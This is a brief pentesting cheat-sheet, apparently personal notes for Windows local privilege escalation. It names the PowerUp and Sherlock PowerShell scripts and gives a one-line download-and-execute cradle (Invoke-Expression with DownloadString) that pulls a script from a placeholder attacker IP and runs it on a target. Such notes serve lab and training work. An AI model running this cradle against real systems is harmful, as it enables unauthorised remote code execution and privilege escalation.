#SCRIPTS
PowerUp.ps1 # low hanging fruits
Sherlock.ps1 # usefull PS1 scripts for localprivesc

# Download a PS1 script onto the Target machine and Execute it.
Invoke-Expression(New-Object System.Net.WebClient).DownloadString('http://MY-IP/script.ps1')